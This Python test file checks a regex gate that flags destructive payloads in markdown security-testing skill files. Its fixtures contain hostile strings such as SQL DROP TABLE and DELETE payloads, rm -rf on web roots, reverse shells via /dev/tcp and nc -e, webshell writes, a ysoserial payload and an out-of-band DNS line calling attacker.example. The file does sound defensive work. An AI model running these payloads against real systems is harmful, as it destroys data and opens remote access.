#!/usr/bin/env python3
"""test_check_destructive_payloads.py — self-check for the destructive-payload gate.

The gate is a set of regexes over markdown prose, and its whole value is its
precision: it must catch the two defects that motivated it and stay silent on
the techniques that are correct practice. Two earlier versions of it produced
80 false positives (a markdown table pipe reads as a shell pipe, and `http://`
reads as a filesystem path), so the negative cases below are load-bearing.
Each one is a real line taken from this bundle.

Run: python3 scripts/test_check_destructive_payloads.py
"""
import os
import subprocess
import sys
import tempfile

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
GATE = os.path.join(REPO, "scripts", "check_destructive_payloads.py")

HEAD = '---\nname: t\ndescription: "t"\n---\n\n# t\n\n'

# (name, body, must_flag)
CASES = [
    # ---- must flag: the two defects that shipped -------------------------------
    ("palo-alto $(id) written into a log path",
     "```bash\n# CVE-2024-3400 detection\n"
     "curl -sk -X POST 'https://target/ssl-vpn/login.esp' \\\n"
     "  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \\\n"
     "  --data 'jsessionid=test'\n```\n", True),
    ("odata DROP TABLE as the illustrative payload",
     "### Attack class 5\n```\n$filter=Name eq 'x'); DROP TABLE Users--'\n```\n", True),

    # ---- must flag: other irreversible shapes ---------------------------------
    ("DELETE FROM in a payload",
     "```\nid=1; DELETE FROM users WHERE 1=1--\n```\n", True),
    ("TRUNCATE in a payload",
     "```\n'; TRUNCATE TABLE sessions--\n```\n", True),
    ("UPDATE ... SET in a payload",
     "```\n'; UPDATE accounts SET balance=0--\n```\n", True),
    ("rm -rf on an absolute path",
     "```bash\ncurl -d 'f=x; rm -rf /var/www' https://target/up\n```\n", True),
    ("reverse shell via /dev/tcp",
     "```bash\ncurl -d 'cmd=bash -c \"sh -i >& /dev/tcp/10.0.0.1/4444 0>&1\"' https://t/x\n```\n", True),
    ("reverse shell via nc -e",
     "```bash\ncurl -d 'cmd=nc -e /bin/sh 10.0.0.1 4444' https://t/x\n```\n", True),
    ("webshell written via substitution",
     "```\n?file=/var/www/html/$(whoami)_shell.php\n```\n", True),
    # Found by a reviewer against an earlier version of this gate: no command
    # substitution at all, so every substitution-anchored rule missed it, but the
    # redirect still leaves a file on the target's disk. Shipped in
    # hunt-deserialization Phase 1 as the ysoserial payload.
    ("payload redirects to a file on the target",
     "```bash\njava -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64\n```\n",
     True),
    ("payload writes a webshell by redirect",
     "```bash\ncurl -d \"cmd=echo x > /var/www/html/s.php\" https://target.example/x\n```\n",
     True),

    # ---- must NOT flag: correct practice --------------------------------------
    ("benign marker ;id is the standard proof",
     "```bash\ncurl -s \"https://$TARGET/api/ping?host=127.0.0.1;id\"\n```\n", False),
    ("benign markers chained in a cgi payload",
     "```bash\ncurl --path-as-is -X POST \\\n"
     "  -d \"echo Content-Type: text/plain; echo; id; uname -a; hostname\" \\\n"
     "  \"http://target/cgi-bin/.%2e/bin/sh\"\n```\n", False),
    ("out-of-band DNS confirmation, the http:// path trap",
     "```bash\ncurl \"http://$(id | base64).YOUR-INTERACTSH-URL/\"\n"
     "nslookup $(whoami).attacker.example\n```\n", False),
    ("tester's own shell pipeline, the markdown-pipe trap",
     "```bash\ncurl -s \"$BASE/env\" | python3 -m json.tool | grep -i \"password\\|secret\"\n"
     "code=$(curl -s -o /dev/null -w \"%{http_code}\" \"https://$TARGET/api\")\n```\n", False),
    ("markdown table holding curl probes",
     "| Docker API | 2375 | `curl -sk -m 5 http://${IP}:2375/v1.40/info` | CRITICAL |\n"
     "| etcd | 2379 | `curl -sk -m 5 https://${IP}:2379/v2/keys/` | HIGH |\n", False),
    ("ERB template injection with a benign marker",
     "**ERB (Ruby):**\n```ruby\n<%= `id` %>\n```\n", False),
    ("exec payload correctly gated behind Stage B",
     "**Stage B — requires explicit written sign-off.** Blast radius: the appliance.\n"
     "```bash\ncurl -sk -H 'Cookie: SESSID=../../x_$(id)_x.txt' 'https://t/login.esp'\n```\n",
     False),
    ("destructive form named in order to ban it",
     "**Never send a destructive payload.** A `DROP TABLE` or `DELETE FROM` in a\n"
     "filter is irreversible and proves nothing the boolean pair does not.\n", False),
    ("destructive form named in a defensive table with its fix",
     "| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |\n",
     False),
    # The tester redirecting a response to their own disk is normal evidence
    # collection and must not be confused with a write on the target.
    ("tester redirects a response to their own disk",
     "```bash\ncurl -s -m 15 -o /tmp/body.txt \"https://$TARGET/api\" > /tmp/hdr.txt\n"
     "CODE=$(curl -s -o /tmp/pma.txt -w '%{http_code}' \"https://$TARGET/x\")\n```\n",
     False),
    ("file-descriptor dup in a gated reverse shell is not a second finding",
     "**Stage B — explicit written sign-off required.**\n"
     "```bash\nsh -i >& /dev/tcp/10.0.0.1/4444 0>&1\n```\n", False),
    ("historical CVE citation naming the payload",
     "CVE-2021-1234: a crafted key was used as a column alias, emitting\n"
     "`SELECT x AS \"y\"; DROP TABLE t;--`. Patched in 2.1.\n", False),
]


def run(body):
    """Write one skill file to a temp dir and return (exit_code, output)."""
    with tempfile.TemporaryDirectory() as td:
        path = os.path.join(td, "SKILL.md")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(HEAD + body)
        proc = subprocess.run([sys.executable, "-I", GATE, path],
                              capture_output=True, text=True)
        return proc.returncode, proc.stdout + proc.stderr


def main():
    failures = []
    for name, body, must_flag in CASES:
        code, out = run(body)
        flagged = code != 0
        if flagged != must_flag:
            want = "flag" if must_flag else "stay silent"
            failures.append(f"{name}: expected the gate to {want}, it did not.\n"
                            f"    exit={code}\n"
                            f"    {out.strip()[:300]}")

    for f in failures:
        print(f"FAIL  {f}")
    print(f"\ntest_check_destructive_payloads: {len(CASES) - len(failures)}/"
          f"{len(CASES)} case(s) passed.")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
